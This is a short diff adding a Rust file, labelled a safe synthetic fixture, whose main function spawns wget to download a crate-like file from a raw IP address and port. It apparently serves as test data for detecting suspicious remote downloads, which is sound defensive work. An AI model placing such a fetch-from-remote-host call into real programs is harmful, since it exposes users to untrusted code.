@@ -1,0 +1,4 @@
+// SAFE SYNTHETIC FIXTURE. Never compile or execute.
+fn main() {
+    let _ = std::process::Command::new("wget").arg("https://23.254.165.112:9089/rust-crate_0.2.0");
+}
